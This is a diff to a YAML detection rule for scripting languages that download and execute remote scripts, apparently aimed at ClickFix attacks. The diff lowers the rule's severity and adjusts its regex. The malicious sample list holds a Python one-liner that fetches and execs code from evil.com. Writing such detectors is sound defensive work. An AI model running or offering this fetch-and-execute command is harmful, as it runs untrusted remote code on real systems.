@@ -1,10 +1,11 @@
-name: high-26-python-ruby-perl
-severity: high
+name: medium-61-python-ruby-perl
+severity: medium
 description: >
-  Detects scripting languages downloading and executing remote scripts. Cross-platform attack vector.
+  Detects scripting languages downloading and executing remote scripts. Uncommon in ClickFix attacks (5-10% prevalence).
+  High legitimate usage in development environments. Requires context to distinguish malicious use.
 
 pattern: |
-  (?i)(python|ruby|perl).*(urllib|requests|eval|exec|Net::HTTP|LWP).*(http|ftp)s?://|(curl|wget).*(http|ftp)s?://.*\|\s*(python|ruby|perl)
+  (?i)(python|ruby|perl).*(urllib|requests|eval|exec|net::http|lwp).*https?://|(curl|wget).*https?://.*\|.*(python|ruby|perl)
 
 malicious:
   - 'python -c "import urllib; exec(urllib.urlopen(''http://evil.com/p.py'').read())"'
